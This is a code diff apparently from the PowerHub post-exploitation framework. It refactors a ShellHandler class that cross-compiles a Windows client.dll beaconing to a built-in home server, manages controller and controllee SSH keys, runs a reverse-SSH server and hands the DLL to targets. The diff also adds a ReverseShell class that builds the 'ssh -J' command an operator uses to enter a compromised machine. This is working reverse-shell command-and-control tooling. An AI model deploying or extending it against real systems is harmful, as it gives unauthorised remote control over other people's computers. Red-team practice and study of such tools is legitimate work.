@@ -41,10 +41,13 @@ REGEX_DISCONNECTED = (
 
 
 class ShellHandler(object):
-    def __init__(self, report_incoming):
-        assert len(getfullargspec(report_incoming).args) == 2
-        self.report_incoming = report_incoming
-        self.report_disconnected = report_incoming  # TODO
+    def __init__(self, host, port, notify_incoming):
+        self.host = host
+        self.port = port
+        assert len(getfullargspec(notify_incoming).args) == 1
+        self.notify_incoming = notify_incoming
+        self.shells = {}
+        self.key_path = os.path.join(directories.RSSH_DIR, "controller_key")
 
         self._state = HandlerState.OFFLINE
         self._thread = None
@@ -56,7 +59,7 @@ class ShellHandler(object):
     def state(self):
         return self._state
 
-    def build(self, host, port):
+    def build(self):
         """Prepare the build process and start it in the background
         """
 
@@ -66,7 +69,7 @@ class ShellHandler(object):
             log.error("Unable to build; missing dependencies")
             return
 
-        home_server = "%s:%d" % (host, port)
+        home_server = "%s:%d" % (self.host, self.port)
         cmd = [shutil.which('make')]
         env = dict(
             CC=shutil.which('x86_64-w64-mingw32-gcc'),
@@ -89,7 +92,7 @@ class ShellHandler(object):
             # Copy the client dll
             shutil.copyfile(
                 os.path.join(working_dir, "bin", "client.dll"),
-                self.normalize_filename(host, port, "client.dll"),
+                self.normalize_filename("client.dll"),
             )
 
             # Append key to authorized_controllee_keys
@@ -138,11 +141,11 @@ class ShellHandler(object):
 
         thread = threading.Thread(
             target=self._build_wrapper,
-            args=(commands, host, port),
+            args=(commands, ),
         )
         thread.start()
 
-    def _build_wrapper(self, commands, host, port):
+    def _build_wrapper(self, commands):
         """Wrapper for the build function
 
         This function ensures clean up.
@@ -153,7 +156,7 @@ class ShellHandler(object):
             with tempfile.TemporaryDirectory(
                 prefix="powerhub_rssh_",
             ) as tmpdir:
-                self._build(tmpdir, commands, host, port)
+                self._build(tmpdir, commands)
         except Exception:
             self._state = HandlerState.OFFLINE
             log.error("Build failed", exc_info=True)
@@ -162,7 +165,7 @@ class ShellHandler(object):
         self._state = HandlerState.OFFLINE
         log.info("Finished building rssh binaries successfully")
 
-    def _build(self, tmpdir, commands, host, port):
+    def _build(self, tmpdir, commands):
         """Actually build the binaries
 
         The repo is copied to a temporary directory to have guaranteed write
@@ -193,9 +196,10 @@ class ShellHandler(object):
 
             c.post(working_dir)
 
-    def normalize_filename(self, host, port, name):
+    def normalize_filename(self, name):
         if name == 'client.dll':
-            result = os.path.join(directories.RSSH_DIR, '%s-%d-%s' % (host, port, name))
+            result = os.path.join(directories.RSSH_DIR, '%s-%d-%s' %
+                                  (self.host, self.port, name))
         else:
             result = os.path.join(directories.RSSH_DIR, name)
         return result
@@ -219,7 +223,7 @@ class ShellHandler(object):
 
         return result
 
-    def is_ready(self, host, port):
+    def is_ready(self):
         """Check whether the binaries have been built"""
         # TODO replace this with a make-like logic
         result = all(
@@ -230,20 +234,20 @@ class ShellHandler(object):
                 'authorized_controllee_keys',
                 'id_ed25519',
             ]
-        ) and os.path.exists(self.normalize_filename(host, port, 'client.dll'))
+        ) and os.path.exists(self.normalize_filename('client.dll'))
         return result
 
-    def run(self, host, port):
+    def run(self):
         if self.state == HandlerState.ONLINE:
             log.info("Handler already running")
             return
 
-        if not self.is_ready(host, port):
+        if not self.is_ready():
             raise RuntimeError("Binaries not built yet")
 
         cmd = [
             os.path.join(directories.RSSH_DIR, 'server'),
-            "%s:%d" % (host, port),
+            "%s:%d" % (self.host, self.port),
         ]
 
         def process_output(self, proc):
@@ -307,19 +311,16 @@ class ShellHandler(object):
             self._proc = None
             self._state = HandlerState.OFFLINE
 
-    def get_client_dll(self, host, port):
+    def get_client_dll(self):
         if self.state != HandlerState.ONLINE:
             log.error("RSSH Handler is not ready")
             return
 
-        path = os.path.join(
-            directories.RSSH_DIR,
-            '%s-%d-%s' % (host, port, 'client.dll'),
-        )
+        path = self.normalize_filename("client.dll")
         result = open(path, 'rb').read()
         return result
 
-    def request_client_dll(self, host, port):
+    def request_client_dll(self):
         """Start server if necessary and return the client_dll or an error code
 
         This is handled here to avoid race conditions, because the build
@@ -330,16 +331,16 @@ class ShellHandler(object):
             self._build_lock.acquire()
 
             if self.state == HandlerState.ONLINE:
-                response = self.get_client_dll(host, port)
+                response = self.get_client_dll()
             elif self.state == HandlerState.BUILDING:
                 response = b"still_building"
             # State is OFFLINE
-            elif self.is_ready(host, port):
+            elif self.is_ready():
                 # Binaries built but not running yet
-                self.run(host, port)
-                response = self.get_client_dll(host, port)
+                self.run()
+                response = self.get_client_dll()
             else:
-                self.build(host, port)
+                self.build()
                 response = b"now_building"
 
             self._build_lock.release()
@@ -347,3 +348,19 @@ class ShellHandler(object):
         finally:
             if self._build_lock.locked():
                 self._build_lock.release()
+
+
+class ReverseShell(object):
+    def __init__(self, handler, src, id_):
+        self.handler = handler
+        self.src = src
+        self.id_ = id_
+
+    def command(self):
+        cmd = "ssh -i %s -J %s:%d %s" % (
+            self.handler.key_path,
+            self.handler.host,
+            self.handler.port,
+            self.id_,
+        )
+        return cmd
